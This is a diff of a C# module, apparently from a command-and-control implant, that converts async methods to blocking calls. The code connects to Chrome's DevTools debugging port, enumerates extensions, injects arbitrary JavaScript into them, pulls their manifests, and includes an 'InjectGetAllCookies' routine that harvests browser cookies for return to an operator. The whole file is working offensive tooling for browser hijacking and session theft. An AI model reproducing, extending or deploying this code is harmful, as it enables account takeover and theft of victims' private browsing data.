@@ -1,12 +1,5 @@
-﻿using Agent;
-using Agent.Interfaces;
-using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Reflection.Metadata.Ecma335;
-using System.Text;
+﻿using Agent.Interfaces;
 using System.Text.Json;
-using System.Threading.Tasks;
 
 namespace Agent
 {
@@ -22,7 +15,7 @@ namespace Agent
 
             return permissions;
         }
-        internal async Task<string> InjectGetAllCookies(ChromeJsonObject extension, string task_id)
+        internal string InjectGetAllCookies(ChromeJsonObject extension, string task_id)
         {
             using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
             {
@@ -30,13 +23,14 @@ namespace Agent
                 //Need to confirm if this is an okay value
                 try
                 {
-                    await webSocket.ConnectAsync(new Uri(extension.webSocketDebuggerUrl), System.Threading.CancellationToken.None);
+                    Task t = webSocket.ConnectAsync(new Uri(extension.webSocketDebuggerUrl), System.Threading.CancellationToken.None);
+                    t.Wait();
                 }
                 catch (Exception e)
                 {
                     if (this.config.debug)
                     {
-                        await ReturnOutput(e.ToString(), task_id);
+                        ReturnOutput(e.ToString(), task_id);
                     }
                     return "";
                 }
@@ -49,98 +43,79 @@ namespace Agent
                 };
                 //Send our request
                 string messageJson = JsonSerializer.Serialize(message);
-                if(!await WebSocketHelper.TrySendMessage(webSocket, messageJson))
+                if(!WebSocketHelper.TrySendMessage(webSocket, messageJson).Result)
                 {
                     return "";
                 }
 
-                return await WebSocketHelper.ReceiveMessage(webSocket);
+                return WebSocketHelper.ReceiveMessage(webSocket).Result;
             }
         }
-        internal async Task<string> InjectJs(string id, string jsCode, CursedConfig config, string task_id)
+        internal string InjectJs(string id, string jsCode, CursedConfig config, string task_id)
         {
-            var extensions = await GetExtensions(config, task_id);
+            var extensions = GetExtensions(config, task_id);
 
             foreach (var extension in extensions)
             {
                 if (extension.id == id)
                 {
-                    return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
+                    return InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
                 }
             }
             return "Failed to identify specified extension.";
         }
         internal bool TryInjectJs(ChromeJsonObject extension, string jsCode, string task_id, out string response)
         {
-            if (this.config.debug)
-            {
-                ReturnOutput("Injectin.", task_id).RunSynchronously();
-            }
-
             try
             {
                 var uri = new Uri(extension.webSocketDebuggerUrl);
-                response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id).Result;
+                response = InjectJs(jsCode, uri, task_id);
                 return true;
             }
             catch (Exception e)
             {
                 if (this.config.debug)
                 {
-                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + e.ToString(), task_id).RunSynchronously();
+                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + e.ToString(), task_id);
                 }
             }
             response = "";
             return false;
         }
-        internal async Task<string> TryInjectJsAsync(ChromeJsonObject extension, string jsCode, string task_id)
+        internal string TryInjectJsAsync(ChromeJsonObject extension, string jsCode, string task_id)
         {
             try
             {
                 var uri = new Uri(extension.webSocketDebuggerUrl);
-                return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
+                return InjectJs(jsCode, uri, task_id);
             }
             catch (Exception e)
             {
                 if (this.config.debug)
                 {
-                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + e.ToString() , task_id).RunSynchronously();
+                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + e.ToString() , task_id);
                 }
                 return "";
             }
         }
-        internal async Task<string> InjectJs(string jsCode, Uri uri, string task_id)
+        internal string InjectJs(string jsCode, Uri uri, string task_id)
         {
             using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
             {
                 try
                 {
-                    if (this.config.debug)
-                    {
-                        await ReturnOutput("Test", task_id);
-                    }
-                    if (this.config.debug)
-                    {
-                        await ReturnOutput("Connecting to " + uri.ToString(), task_id);
-                    }
-                    await webSocket.ConnectAsync(uri, System.Threading.CancellationToken.None);
-                    if (this.config.debug)
-                    {
-                        await ReturnOutput("Connected to " + uri.ToString(), task_id);
-                    }
+                    Task t = webSocket.ConnectAsync(uri, CancellationToken.None);
+                    t.Wait();
                 }
                 catch (Exception e)
                 {
                     if (this.config.debug)
                     {
-                        await ReturnOutput(e.ToString(), task_id);
+                        ReturnOutput(e.ToString(), task_id);
                     }
                     return "";
                 }
-                if (this.config.debug)
-                {
-                    await ReturnOutput("building message.", task_id);
-                }
+
                 // Build the DevTools Protocol message to execute JavaScript
                 var message = new
                 {
@@ -152,21 +127,10 @@ namespace Agent
                         returnByValue = true
                     }
                 };
-                if (this.config.debug)
-                {
-                    await ReturnOutput("Serializin", task_id);
-                }
 
                 // Convert the message to JSON and send it to the WebSocket
                 string messageJson = string.Empty;
-                if (this.config.debug)
-                {
-                    await ReturnOutput(jsCode, task_id);
-                    await ReturnOutput(message.id.ToString(), task_id);
-                    await ReturnOutput(message.method, task_id);
-                    await ReturnOutput(message.@params.expression, task_id);
-                    await ReturnOutput(message.@params.returnByValue.ToString(), task_id);
-                }
+
                 try
                 {
                     messageJson = JsonSerializer.Serialize(message);
@@ -175,31 +139,27 @@ namespace Agent
                 {
                     if (this.config.debug)
                     {
-                        await ReturnOutput("Error Serializing Message" + Environment.NewLine + jsCode + Environment.NewLine + e.ToString(), task_id);
+                        ReturnOutput("Error Serializing Message" + Environment.NewLine + jsCode + Environment.NewLine + e.ToString(), task_id);
                     }
                     return "";
                 }
-                if (this.config.debug)
-                {
-                    await ReturnOutput("Done Serializin", task_id);
-                }
 
-                if (!await WebSocketHelper.TrySendMessage(webSocket, messageJson))
+                if (!WebSocketHelper.TrySendMessage(webSocket, messageJson).Result)
                 {
                     if (this.config.debug)
                     {
-                        await ReturnOutput("Failed to send message.", task_id);
+                        ReturnOutput("Failed to send message.", task_id);
                     }
                     return "";
                 }
                 if (this.config.debug)
                 {
-                    await ReturnOutput("Waiting for response.", task_id);
+                    ReturnOutput("Waiting for response.", task_id);
                 }
-                return await WebSocketHelper.ReceiveMessage(webSocket);
+                return WebSocketHelper.ReceiveMessage(webSocket).Result;
             }
         }
-        internal async Task<List<ChromeJsonObject>> GetExtensions(CursedConfig config, string task_id)
+        internal List<ChromeJsonObject> GetExtensions(CursedConfig config, string task_id)
         {
             List<ChromeJsonObject> extensions = new List<ChromeJsonObject>();
             using (HttpClient client = new HttpClient())
@@ -208,10 +168,10 @@ namespace Agent
                 {
                     // Fetch list of targets from DevTools Protocol
                     string targetsUrl = $"http://localhost:{config.debug_port}/json/list";
-                    string targetsJson = await client.GetStringAsync(targetsUrl);
+                    string targetsJson = client.GetStringAsync(targetsUrl).Result;
                     if (this.config.debug)
                     {
-                        await ReturnOutput(targetsJson, task_id);
+                        ReturnOutput(targetsJson, task_id);
                     }
 
                     List<ChromeJsonObject> targets = JsonSerializer.Deserialize<List<ChromeJsonObject>>(targetsJson);
@@ -228,30 +188,30 @@ namespace Agent
                 {
                     if (this.config.debug)
                     {
-                        await ReturnOutput(e.ToString(), task_id);
+                        ReturnOutput(e.ToString(), task_id);
                     }
                 }
             }
             return extensions;
         }
-        internal async Task<ExtensionManifest> GetManifestFromExtension(ChromeJsonObject extension, string task_id)
+        internal ExtensionManifest GetManifestFromExtension(ChromeJsonObject extension, string task_id)
         {
             if (this.config.debug)
             {
-                await ReturnOutput(extension.id + Environment.NewLine, task_id);
+                ReturnOutput(extension.id + Environment.NewLine, task_id);
             }
 
             if (!TryInjectJs(extension, "chrome.runtime.getManifest()", task_id, out var response)) 
             {
                 if (this.config.debug)
                 {
-                    await ReturnOutput("Error getting manifest for " + extension.id + " " + response, task_id);
+                    ReturnOutput("Error getting manifest for " + extension.id + " " + response, task_id);
                 }
                 return null; 
             }
             if (this.config.debug)
             {
-                await ReturnOutput(response, task_id);
+                ReturnOutput(response, task_id);
             }
 
             JsonDocument responseJsonDocument;
@@ -262,7 +222,7 @@ namespace Agent
             }
             catch (Exception e)
             {
-                await ReturnOutput("Failure getting manifest." + Environment.NewLine + e.ToString(), task_id);
+                ReturnOutput("Failure getting manifest." + Environment.NewLine + e.ToString(), task_id);
                 return null;
             }
 
@@ -271,7 +231,7 @@ namespace Agent
 
             if (!responseRoot.TryGetProperty("result", out JsonElement resultElement))
             {
-                await ReturnOutput("Failure parsing manifest from result.", task_id);
+                ReturnOutput("Failure parsing manifest from result.", task_id);
                 return null;
             }
 
@@ -281,7 +241,7 @@ namespace Agent
             }
             catch (Exception e)
             {
-                await ReturnOutput("Failure deserializing manifest." + Environment.NewLine + e.ToString(), task_id);
+                ReturnOutput("Failure deserializing manifest." + Environment.NewLine + e.ToString(), task_id);
                 return null;
             }
         }
